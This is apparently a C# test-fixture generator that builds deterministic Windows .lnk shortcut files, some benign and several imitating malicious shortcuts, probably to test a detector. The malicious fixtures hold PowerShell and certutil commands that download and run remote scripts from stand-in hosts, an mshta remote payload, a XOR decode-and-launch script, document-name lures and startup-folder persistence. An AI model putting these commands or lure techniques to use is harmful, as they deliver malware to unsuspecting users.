using System.Text;

namespace Effigy;

/// <summary>
/// Deterministic .lnk fixture forge. Every fixture is built from a fixed
/// epoch (unix 1760000000) so two builds produce byte-identical files —
/// the e2e suite pins those bytes via SHA-256.
/// </summary>
public static class Forge
{
    public const long FixedEpoch = 1760000000;
    public static readonly ulong FixedFileTime = FileTime.FromUnixSeconds(FixedEpoch);

    private sealed class Buf
    {
        public readonly MemoryStream Ms = new();
        public void U8(byte v) => Ms.WriteByte(v);
        public void U16(ushort v) { Ms.WriteByte((byte)(v & 0xFF)); Ms.WriteByte((byte)((v >> 8) & 0xFF)); }
        public void U32(uint v) { U16((ushort)(v & 0xFFFF)); U16((ushort)((v >> 16) & 0xFFFF)); }
        public void U64(ulong v) { U32((uint)(v & 0xFFFFFFFF)); U32((uint)((v >> 32) & 0xFFFFFFFF)); }
        public void Guid(Guid g) { foreach (var b in g.ToByteArray()) Ms.WriteByte(b); }
        public void Bytes(byte[] b) => Ms.Write(b);
        public void Ansi(string s)
        {
            foreach (char ch in s) Ms.WriteByte(ch <= 0xFF ? (byte)ch : (byte)'?');
            Ms.WriteByte(0);
        }
        public void Wide(string s)
        {
            foreach (char ch in s) { Ms.WriteByte((byte)(ch & 0xFF)); Ms.WriteByte((byte)((ch >> 8) & 0xFF)); }
            Ms.WriteByte(0); Ms.WriteByte(0);
        }
        public byte[] ToArray() => Ms.ToArray();
    }

    public sealed class Spec
    {
        public uint LinkFlags;
        public uint FileAttrs = 0x20; // FILE_ATTRIBUTE_ARCHIVE
        public ulong Ctime = FixedFileTime, Atime = FixedFileTime, Wtime = FixedFileTime;
        public uint FileSize = 0;
        public int IconIndex = 0;
        public uint ShowCommand = 1;
        public ushort HotKey = 0;
        public string? Name, RelativePath, WorkingDir, Arguments, IconLocation;
        public byte[]? IdList;               // raw item bytes (without the u16 total-size field)
        public LinkInfoSpec? LinkInfo;
        public List<byte[]> Blocks = new();  // pre-serialized extra blocks
        public byte[]? Overlay;
        public bool Wide = true;
    }

    public sealed class LinkInfoSpec
    {
        public uint DriveType = 3;             // fixed
        public uint Serial = 0x1A2B3C4D;
        public string VolumeLabel = "OS";
        public string LocalBasePath = "";
        public string? NetName, NetDevice;     // when set, network link is emitted
        public string CommonPathSuffix = "";
    }

    public static byte[] Build(Spec s)
    {
        uint flags = s.LinkFlags;
        if (s.IdList != null) flags |= ParseHeader.HasTargetIdList;
        if (s.LinkInfo != null) flags |= ParseHeader.HasLinkInfo;
        if (s.Name != null) flags |= ParseHeader.HasName;
        if (s.RelativePath != null) flags |= ParseHeader.HasRelativePath;
        if (s.WorkingDir != null) flags |= ParseHeader.HasWorkingDir;
        if (s.Arguments != null) flags |= ParseHeader.HasArguments;
        if (s.IconLocation != null) flags |= ParseHeader.HasIconLocation;
        if (s.Wide) flags |= ParseHeader.IsUnicode;
        s.LinkFlags = flags;

        var b = new Buf();
        // Header
        b.U32(0x4C);
        b.Guid(new Guid("00021401-0000-0000-C000-000000000046"));
        b.U32(flags);
        b.U32(s.FileAttrs);
        b.U64(s.Ctime); b.U64(s.Atime); b.U64(s.Wtime);
        b.U32(s.FileSize);
        b.U32(unchecked((uint)s.IconIndex));
        b.U32(s.ShowCommand);
        b.U16(s.HotKey);
        b.U16(0); // Unknown1
        b.U32(0); // Reserved1  -> header totals 0x4C bytes
        b.U32(0); // Reserved2

        if ((flags & ParseHeader.HasTargetIdList) != 0 && s.IdList != null)
        {
            b.U16((ushort)(s.IdList.Length + 2));
            b.Bytes(s.IdList);
            b.U16(0); // TerminalID
        }

        if ((flags & ParseHeader.HasLinkInfo) != 0 && s.LinkInfo != null)
            b.Bytes(BuildLinkInfo(s.LinkInfo));

        // StringData in canonical flag order
        if (s.Name != null) WriteString(b, s.Name, s.Wide);
        if (s.RelativePath != null) WriteString(b, s.RelativePath, s.Wide);
        if (s.WorkingDir != null) WriteString(b, s.WorkingDir, s.Wide);
        if (s.Arguments != null) WriteString(b, s.Arguments, s.Wide);
        if (s.IconLocation != null) WriteString(b, s.IconLocation, s.Wide);

        foreach (var blk in s.Blocks) b.Bytes(blk);
        b.U32(0); // terminal block

        if (s.Overlay != null) b.Bytes(s.Overlay);
        return b.ToArray();
    }

    private static void WriteString(Buf b, string value, bool wide)
    {
        // CharacterCount includes the null terminator on both encodings.
        if (wide)
        {
            b.U16((ushort)(value.Length + 1));
            b.Wide(value);
        }
        else
        {
            b.U16((ushort)(value.Length + 1));
            b.Ansi(value);
        }
    }

    public static byte[] BuildLinkInfo(LinkInfoSpec li)
    {
        var body = new Buf();
        uint flags = 0;
        if (li.LocalBasePath.Length > 0) flags |= 0x1;
        if (li.NetName != null) flags |= 0x2;

        byte[] volume = Array.Empty<byte>();
        byte[] net = Array.Empty<byte>();
        if ((flags & 0x1) != 0)
        {
            var v = new Buf();
            v.U32(0); v.U32(li.DriveType); v.U32(li.Serial); v.U32(0x14); // label offset after fixed header
            v.Ansi(li.VolumeLabel);
            volume = v.ToArray();
        }
        if (li.NetName != null)
        {
            var n = new Buf();
            n.U32(0); n.U32(0x3); // VALID_DEVICE|VALID_NETNAME
            n.U32(0x14); n.U32(0); n.U32(0); // offsets patched after sizing, device absent
            n.Ansi(li.NetName);
            if (li.NetDevice != null) { }
            net = n.ToArray();
        }

        // header is 0x1C; layout offsets are relative to LinkInfo start
        int volumeOff = volume.Length > 0 ? 0x1C : 0;
        int basePathOff = volume.Length > 0 ? volumeOff + volume.Length : 0x1C;
        byte[] basePath = li.LocalBasePath.Length > 0 ? AsciiZ(li.LocalBasePath) : Array.Empty<byte>();
        int netOff = net.Length > 0 ? basePathOff + basePath.Length : 0;
        byte[] suffix = AsciiZ(li.CommonPathSuffix);
        int suffixOff = net.Length > 0 ? netOff + net.Length : basePathOff + basePath.Length;
        if (volume.Length == 0 && net.Length == 0) suffixOff = 0x1C;

        int total = suffixOff + suffix.Length;
        var b = new Buf();
        b.U32((uint)total);
        b.U32(0x1C);
        b.U32(flags);
        b.U32((uint)volumeOff);
        b.U32((uint)basePathOff);
        b.U32((uint)netOff);
        b.U32((uint)suffixOff);
        b.Bytes(volume);
        b.Bytes(basePath);
        b.Bytes(net);
        b.Bytes(suffix);
        return b.ToArray();
    }

    private static byte[] AsciiZ(string s)
    {
        var outp = new byte[s.Length + 1];
        for (int i = 0; i < s.Length; i++) outp[i] = s[i] <= 0xFF ? (byte)s[i] : (byte)'?';
        return outp;
    }

    // ---- extra block builders ----

    public static byte[] TrackerBlock(string machineId, string droidVol, string droidFile, string birthVol, string birthFile)
        => Block(ParseBlocks.Tracker, b =>
        {
            b.U32(0x58); b.U32(0x00000002);
            b.Guid(Guid.Parse(machineId)); b.Guid(Guid.Parse(droidVol)); b.Guid(Guid.Parse(droidFile));
            b.Guid(Guid.Parse(birthVol)); b.Guid(Guid.Parse(birthFile));
        });

    public static byte[] EnvironmentBlock(string target)
        => Block(ParseBlocks.EnvironmentVariable, b =>
        {
            var ansi = new byte[260]; var wide = new byte[520];
            for (int i = 0; i < Math.Min(259, target.Length); i++) ansi[i] = (byte)target[i];
            for (int i = 0; i < Math.Min(259, target.Length); i++)
            {
                wide[i * 2] = (byte)target[i];
                wide[i * 2 + 1] = 0;
            }
            b.Bytes(ansi); b.Bytes(wide);
        });

    public static byte[] SpecialFolderBlock(uint id)
        => Block(ParseBlocks.SpecialFolder, b => b.U32(id));

    public static byte[] KnownFolderBlock(Guid g)
        => Block(ParseBlocks.KnownFolder, b => { b.Guid(g); b.U32(0); });

    private static byte[] Block(uint sig, Action<Buf> body)
    {
        var bodyBuf = new Buf();
        body(bodyBuf);
        var bytes = bodyBuf.ToArray();
        var b = new Buf();
        b.U32((uint)(8 + bytes.Length));
        b.U32(sig);
        b.Bytes(bytes);
        return b.ToArray();
    }

    // ---- IDList item builders ----

    public static byte[] IdListItem(byte kind, byte[] body)
    {
        var b = new Buf();
        b.U16((ushort)(2 + 1 + body.Length));
        b.U8(kind);
        b.Bytes(body);
        return b.ToArray();
    }

    public static byte[] RootItem(string guid) => IdListItem(0x1F, Guid.Parse(guid).ToByteArray());
    public static byte[] DirItem(string name) => IdListItem(0x2F, AsciiZ(name));
    public static byte[] DriveItem(string letter)
    {
        var body = new Buf();
        body.U8(0); body.U8(0); body.U8(0); // sort order
        body.Bytes(AsciiZ(letter));
        return IdListItem(0x44, body.ToArray());
    }
    public static byte[] FileItem(string name, bool unicode)
    {
        var body = new Buf();
        body.Bytes(AsciiZ(name));
        // extension block with sizes + FAT time (kept minimal but real)
        body.U32(0x1C); body.U32((uint)name.Length);
        body.U32(0); body.U32(0x1A); body.U32(0);
        body.U16((ushort)(FixedFileTime & 0xFFFF)); body.U16((ushort)((FixedFileTime >> 16) & 0xFFFF));
        body.U16((ushort)((FixedFileTime >> 32) & 0xFFFF)); body.U16((ushort)((FixedFileTime >> 48) & 0xFFFF));
        return IdListItem((byte)(unicode ? 0x34 : 0x30), body.ToArray());
    }

    // ---- fixtures ----

    public static IEnumerable<(string name, byte[] bytes)> AllFixtures()
    {
        const string myComputer = "20D04FE0-3AEA-1069-A2D8-08002B30309D";
        const string networkRoot = "208D2C60-3AEA-1069-A2D7-08002B30309D";
        const string startupGuid = "B97D20BB-F46A-4C97-BA10-5E3608430854";
        const string trackerMachine = "5E4C1A77-3F2B-4A1D-9C0E-1B2A3C4D5E6F";

        // 1. clean-note: plain local shortcut, no extras.
        yield return ("clean-note.lnk", Build(new Spec
        {
            Name = "Notes",
            RelativePath = "notes.txt",
            WorkingDir = "C:\\Users\\dev\\Desktop",
            IconLocation = "C:\\Windows\\System32\\notepad.exe",
            LinkInfo = new LinkInfoSpec
            {
                LocalBasePath = "C:\\Windows\\System32\\notepad.exe",
                CommonPathSuffix = "",
            },
        }));

        // 2. clean-pdf-ref: document reference shortcut.
        yield return ("clean-pdf-ref.lnk", Build(new Spec
        {
            Name = "Handbook",
            RelativePath = "docs\\handbook.pdf",
            WorkingDir = "C:\\Users\\dev\\Documents",
            IconLocation = "C:\\Program Files\\Reader\\reader.ico",
            LinkInfo = new LinkInfoSpec
            {
                LocalBasePath = "C:\\Users\\dev\\Documents\\docs\\handbook.pdf",
                CommonPathSuffix = "",
            },
        }));

        // 3. clean-electron: modern app launcher — long benign args, quiet window, tracker block.
        string electronArgs = string.Join(" ",
            "--profile-directory=Default", "--disable-session-crashed-bubble",
            "--enable-features=UseOzonePlatform,VaapiVideoDecodeLinuxGL",
            "--disable-features=ChromeWhatsNewUI,MediaRouter",
            "--ozone-platform-hint=auto", "--process-per-site",
            "--force-color-profile=srgb", "--enable-wayland-ime",
            "--password-store=basic", "--no-first-run", "--no-default-browser-check");
        yield return ("clean-electron.lnk", Build(new Spec
        {
            Name = "Editor",
            RelativePath = "local\\apps\\Editor\\editor.exe",
            WorkingDir = "local\\apps\\Editor",
            Arguments = electronArgs,
            IconLocation = "local\\apps\\Editor\\editor.exe",
            ShowCommand = 7,
            IdList = Concat(RootItem(myComputer), DriveItem("C:"), DirItem("local"), DirItem("apps"), DirItem("Editor"), FileItem("editor.exe", true)),
            LinkInfo = new LinkInfoSpec
            {
                LocalBasePath = "C:\\Users\\dev\\local\\apps\\Editor\\editor.exe",
                CommonPathSuffix = "local\\apps\\Editor\\",
            },
            Blocks = { TrackerBlock(trackerMachine, "11111111-2222-3333-4444-555555555555", "66666666-7777-8888-9999-000000000000", "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee", "ffff0000-1111-2222-3333-444444444444") },
        }));

        // 4. dropper-encoded: powershell with base64 in-argument payload (Unit42 in-argument class).
        string stage = "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.7/stage.ps1')";
        string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(stage));
        yield return ("dropper-encoded.lnk", Build(new Spec
        {
            Name = "Presentation",
            RelativePath = "briefing.ppsx",
            IconLocation = "C:\\Windows\\System32\\imageres.dll,-109",
            Arguments = "powershell -nop -w hidden -enc " + encoded,
            LinkInfo = new LinkInfoSpec
            {
                LocalBasePath = "C:\\Windows\\System32\\cmd.exe",
                CommonPathSuffix = "",
            },
            Blocks = { TrackerBlock(trackerMachine, "11111111-2222-3333-4444-555555555555", "66666666-7777-8888-9999-000000000000", "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee", "ffff0000-1111-2222-3333-444444444444") },
        }));

        // 5. dropper-remote: mshta with remote payload URL.
        yield return ("dropper-remote.lnk", Build(new Spec
        {
            Name = "Invoice",
            RelativePath = "invoice.pdf",
            IconLocation = "C:\\Windows\\System32\\shell32.dll,-154",
            Arguments = "http://198.51.100.8/cdn/auth.hta",
            LinkInfo = new LinkInfoSpec
            {
                LocalBasePath = "C:\\Windows\\System32\\mshta.exe",
                CommonPathSuffix = "",
            },
        }));

        // 6. unc-staging: shortcut pointing into a network share.
        yield return ("unc-staging.lnk", Build(new Spec
        {
            Name = "Shared Doc",
            RelativePath = "invoice.docx",
            WorkingDir = "\\\\files-balt-01\\share",
            IdList = Concat(RootItem(networkRoot), DirItem("files-balt-01"), DirItem("share"), FileItem("invoice.docx", true)),
            LinkInfo = new LinkInfoSpec
            {
                NetName = "files-balt-01",
                NetDevice = "S:",
                CommonPathSuffix = "share\\invoice.docx",
            },
        }));

        // 7. spoofed-icon: document display name, script-host target, remote fetch.
        yield return ("spoofed-icon.lnk", Build(new Spec
        {
            Name = "Invoice",
            RelativePath = "reports\\Invoice_2026Q4.pdf",
            WorkingDir = "C:\\Windows\\Temp",
            Arguments = "/c powershell -nop -c certutil -urlcache -f http://198.51.100.9/inv.ps1 %TEMP%\\inv.ps1 && start /b %TEMP%\\inv.ps1",
            IconLocation = "C:\\Program Files\\Reader\\acrord32.exe",
            LinkInfo = new LinkInfoSpec
            {
                LocalBasePath = "C:\\Windows\\System32\\cmd.exe",
                CommonPathSuffix = "",
            },
        }));

        // 8. stomped: zeroed timestamps, rundll32, environment-block exec path, quiet window.
        yield return ("stomped.lnk", Build(new Spec
        {
            Name = "svc",
            RelativePath = "tools\\svc.exe",
            ShowCommand = 7,
            Ctime = 0, Atime = 0, Wtime = 0,
            IdList = Concat(RootItem(myComputer), DriveItem("C:"), DirItem("Windows"), DirItem("System32"), FileItem("rundll32.exe", true)),
            LinkInfo = new LinkInfoSpec
            {
                LocalBasePath = "C:\\Windows\\System32\\rundll32.exe",
                CommonPathSuffix = "",
            },
            Blocks = { EnvironmentBlock("%TEMP%\\svchost.exe") },
        }));

        // 9. xor-decoder: decoder loop + hex payload in arguments, script overlay after terminal block.
        string xorArgs = "$d = { param($loc, $len, $key) $raw = [IO.File]::ReadAllBytes($loc); " +
                         "for($i = 0; $i -lt $len; $i++) { $raw[$i] = $raw[$i] -bxor $key }; " +
                         "[Text.Encoding]::ASCII.GetString($raw) }; $d('C:\\Users\\dev\\AppData\\Roaming\\svc.dat', 4096, 0x2f); " +
                         "4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000000000000000000";
        string overlayScript = "$k = 0x2f; $b = [IO.File]::ReadAllBytes('C:\\Users\\dev\\stage.bin'); " +
                               "for($i = 0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor $k }; " +
                               "[IO.File]::WriteAllBytes('C:\\Users\\dev\\stage.exe', $b); Start-Process 'C:\\Users\\dev\\stage.exe'";
        yield return ("xor-decoder.lnk", Build(new Spec
        {
            Name = "Report",
            RelativePath = "quarterly_report.docm",
            IconLocation = "C:\\Windows\\System32\\shell32.dll,-156",
            Arguments = xorArgs,
            LinkInfo = new LinkInfoSpec
            {
                LocalBasePath = "C:\\Windows\\System32\\rundll32.exe",
                CommonPathSuffix = "",
            },
            Overlay = Encoding.UTF8.GetBytes(overlayScript),
        }));

        // 10. startup-persist: startup-folder placement.
        yield return ("startup-persist.lnk", Build(new Spec
        {
            Name = "Updater",
            RelativePath = "Update\\sync.vbs",
            Arguments = "//B //Nologo \"C:\\Users\\dev\\AppData\\sync.vbs\"",
            IconLocation = "C:\\Windows\\System32\\wscript.exe",
            LinkInfo = new LinkInfoSpec
            {
                LocalBasePath = "C:\\Windows\\System32\\wscript.exe",
                CommonPathSuffix = "",
            },
            Blocks = { KnownFolderBlock(Guid.Parse(startupGuid)) },
        }));
    }

    public static byte[] Concat(params byte[][] parts)
    {
        int total = parts.Sum(p => p.Length);
        var outp = new byte[total];
        int at = 0;
        foreach (var p in parts) { Array.Copy(p, 0, outp, at, p.Length); at += p.Length; }
        return outp;
    }
}
